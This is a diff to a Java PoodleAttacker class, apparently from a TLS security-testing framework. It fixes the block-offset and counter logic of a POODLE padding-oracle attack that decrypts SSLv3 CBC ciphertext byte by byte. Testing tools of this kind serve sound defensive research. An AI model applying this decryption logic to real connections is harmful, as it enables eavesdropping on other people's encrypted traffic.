@@ -179,7 +179,7 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
 
         int positionOfBlockToDecrypt = 1;
 
-        while (true) {
+        while (positionOfBlockToDecrypt < 4) {
             i++;
             CONSOLE.info("ITERATION: " + i + "     " + "Decrypted message: " + decryptedMessage);
             Config conf = config.createConfig();
@@ -259,13 +259,13 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                         CONSOLE.info("=====================DECRYPTING BYTE=====================================");
 
                         // Get the block before the message block we are going to decrypt
-                        byte[] block_before_message = Arrays.copyOfRange(modified_bytes, message_offset,
+                        byte[] block_before_message = Arrays.copyOfRange(modified_bytes, message_offset + (block_size*(positionOfBlockToDecrypt-1)),
                         message_offset + (block_size*positionOfBlockToDecrypt));
 
                         // Gets the block that is positioned before the padding block
                         byte[] block_before_padding = Arrays.copyOfRange(modified_bytes,
                                 modified_bytes.length - 2 * block_size,
-                                (modified_bytes.length - 2 * block_size) + block_size);
+                                modified_bytes.length -  block_size);
 
                         byte found_byte;
 
@@ -275,12 +275,14 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                             found_byte = (byte) (block_before_message[15] ^ block_before_padding[15] ^ 0xF);
                         }
 
-                        decryptedBytesSoFar++;
-
                         // If we decrypted the full block then move to the next block
                         if(decryptedBytesSoFar == block_size){
                             positionOfBlockToDecrypt++;
+                            decryptedBytesSoFar=0;
+                            httphandler.block_decrypted = true;
                         }
+
+                        decryptedBytesSoFar++;
 
                         // I put it in a byte array to convert it easier to string, there has to be a
                         // better way
